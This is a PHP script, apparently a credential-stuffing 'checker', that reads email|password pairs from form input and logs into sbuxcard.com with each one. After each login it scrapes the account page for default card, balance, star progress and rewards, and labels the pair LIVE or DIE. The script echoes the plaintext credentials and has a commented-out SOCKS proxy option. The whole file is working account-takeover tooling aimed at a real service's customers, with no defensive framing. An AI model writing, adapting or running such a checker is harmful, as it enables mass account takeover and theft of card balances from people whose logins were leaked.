<?php
session_start();
error_reporting(0); 
?>
<?php
date_default_timezone_set("Asia/Jakarta");
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$hasil = array();

if (!isset($format)) {
header('location: ./');
exit;
}
require 'includes/class_curl.php';
if (isset($format)){
    
    // cek wrong
    if ($pisah[1] == '' || $pisah[1] == null) {
        die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
    }
    
  $mailcount = strlen($pisah[0]);
  $passcount = strlen($pisah[1]);

  $curl = new curl();
  $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
   // $curl->ref('https://www.sbuxcard.com/');
   // $curl->socks($sock);
   $curl->ssl(0, 2);
 
   $url = "https://www.sbuxcard.com/index.php?page=signin";
 
   $page = $curl->get($url);
   $cookies = fetchCurlCookies($page);
   $visid = $cookies['visid_incap_1107200'];
   $PHPSESSID  = $cookies['PHPSESSID'];
   $SERVERID = $cookies['SERVERID'];
     
   if ($page) {
   $headers = array();
   $headers[] = "Content-Type: application/x-www-form-urlencoded";
   $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
   $headers[] = "Referer: https://www.sbuxcard.com/index.php?page=signin";
   $headers[] = "Accept-Encoding: gzip, deflate, br";
   $headers[] = "Accept-Language: en-US,en;q=0.9";
   $headers[] = "Cookie: visid_incap_1107200=$visid;";
   $curl->header($headers);
   $token = fetch_value($page,'name="token" value="','"');
           /* PostData */
   $data = "token=$token&Email=$pisah[0]&Password=$pisah[1]&txtaction=signin&emailcount=$mailcount&passcount=$passcount";
   $page = $curl->post($url, $data);
   $page = $curl->get("https://www.sbuxcard.com/index.php?page=account");
   if (inStr($page, "Manage your Starbucks Cards")) {
   $card = getStr($page,'<strong>default card (',')</strong>');
   $progress = getStr($page,'<div class="star-earned-font-4"><span class="bold">','</span></div>');
   $reward = getStr2($page,'<span class="account-offer-count">','</span>');
   $saldo = getStr($page,'<div class="boldfont" style="font-size: 24px; margin: 5px 0px;">','</div>');
    $result['error'] = 0;
    $result['msg'] = '<font color=green>LIVE</b></font> | '.$pisah[0].' | '.$pisah[1].' | [ Default card : '.$card.' '.$saldo.' Active ] | [ Progress : '.$progress.' Reward : '.$reward.' ] | [ACC:SbuxCard] [ Login successfully ]' ;
    die(json_encode($result));
    exit();
    } else {
    die('{"error":2,"msg":"<font color=red>DIE.</font> | '.$pisah[0].' | ' . $pisah[1] . ' | No info. [ Incorrect email or password ]"}');
    die(json_encode($result));
    }
}
}
?>